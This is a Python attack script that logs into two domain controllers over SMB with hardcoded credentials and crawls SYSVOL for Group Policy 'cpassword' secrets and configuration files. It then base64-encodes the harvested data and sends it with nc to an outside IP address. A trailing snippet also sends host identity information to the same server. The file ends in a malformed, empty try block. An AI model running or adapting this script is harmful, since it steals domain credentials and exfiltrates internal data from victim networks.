#!/usr/bin/env python3
# GPP/SYSVOL hunt: recursive walk SYSVOL on DCs, full listing + slurp xml/inf/ini/cfg files
import sys, os, base64, subprocess
sys.path.insert(0, "/tmp/imp")
from impacket.smbconnection import SMBConnection

OUT = "/tmp/.GPPh.txt"
out = open(OUT, "wb")
def w(s):
    if isinstance(s, str): s = s.encode("utf-8", "replace")
    out.write(s + b"\n")

IPLIST = ["10.61.10.11", "10.61.10.10"]
EXT = (".xml", ".inf", ".ini", ".cfg", ".config", ".aaabase", ".txt", ".kix", ".bat", ".cmd", ".ps1", ".vbs", ".ldf", ".reg")
MAXF = 512 * 1024

def walk(c, share, path, listing):
    try:
        ents = c.listPath(share, path + "\\*")
    except Exception as e:
        w("  ERR %s %s" % (path, str(e)[:80])); return
    for e in ents:
        fn = e.get_longname()
        if fn in (".", ".."): continue
        full = path + "\\" + fn
        if e.is_directory():
            walk(c, share, full, listing)
        else:
            sz = 0
            try: sz = e.get_filesize()
            except Exception: pass
            listing.append((full, sz))

for ip in IPLIST:
    w("=== %s GPP hunt ===" % ip)
    try:
        c = SMBConnection(ip, ip, timeout=10)
        c.login("rez", "!QAZxsw2", "MLT", "", "")
    except Exception as e:
        w("LOGIN_ERR %s" % str(e)[:120]); continue
    listing = []
    walk(c, "SYSVOL", "", listing)
    w("LIST %d entries" % len(listing))
    hits = []
    for p, sz in listing:
        low = p.lower()
        if low.endswith(EXT) and sz <= MAXF:
            try:
                import io
                bio = io.BytesIO()
                c.getFile("SYSVOL", p, bio.write)
                data = bio.getvalue()
            except Exception as e:
                w("GET_ERR %s %s" % (p, str(e)[:80])); continue
            tag = ""
            if b"cpassword" in data.lower(): tag = "CPASSWORD!!!"
            if tag or low.endswith((".xml", ".inf", ".ini", ".cfg", ".config")):
                hits.append(p)
                w("=== FILE %sSYSVOL%s (%dB) %s ===" % ("\\\\" + ip + "\\", p, len(data), tag))
                try: out.write(data[:MAXF]); out.write(b"\n")
                except Exception: pass
    w("slurped=%d" % len(hits))
    for f, sz in listing[:60000]:
        w("L %d %s" % (sz, f))
    try: c.logoff()
    except Exception: pass
    w("=== %s done ===" % ip)
out.close()

# post raw in parts
S = os.path.getsize(OUT)
if S < 4000000:
    b = base64.b64encode(open(OUT, "rb").read()).decode()
    subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: mel2_gpph\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 300 nc 131.123.43.239 80" % (len(b), b), shell=True)
else:
    subprocess.run("split -b 3500k %s /tmp/.gp_ && for x in /tmp/.gp_*; do b=$(base64 -w0 \"$x\"); printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: mel2_gpph_part\\r\\nContent-Length: '${#b}'\\r\\n\\r\\n'$b | timeout 90 nc 131.123.43.239 80; done" % OUT, shell=True)
print("GPPH_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

